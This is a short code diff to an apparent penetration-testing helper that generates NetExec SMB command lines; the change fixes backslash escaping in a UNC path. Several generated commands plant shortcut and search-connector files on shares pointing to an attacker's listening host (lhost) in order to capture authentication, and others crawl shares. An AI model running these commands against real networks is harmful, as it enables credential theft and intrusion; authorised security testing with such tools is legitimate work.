@@ -73,7 +73,7 @@ class CommandNxcSmb(Command):
         commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M slinky -o server={self.lhost} name=afriedlyshortcut')
         commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M slinky -o cleanup=yes name=afriedlyshortcut')
         commands.append('## drop-sc')
-        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M drop-sc -o url=\\\\{self.lhost}\\test share=exampleshare filename=important.txt')
+        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M drop-sc -o url=\\\\\\\\{self.lhost}\\\\test share=exampleshare filename=important.txt')
         commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M drop-sc -o cleanup=true share=exampleshare filename=important.txt')
         commands.append('## spider_plus')
         commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M spider_plus -o exclude_dir=IPC$,PRINT$,NETLOGON,SYSVOL')
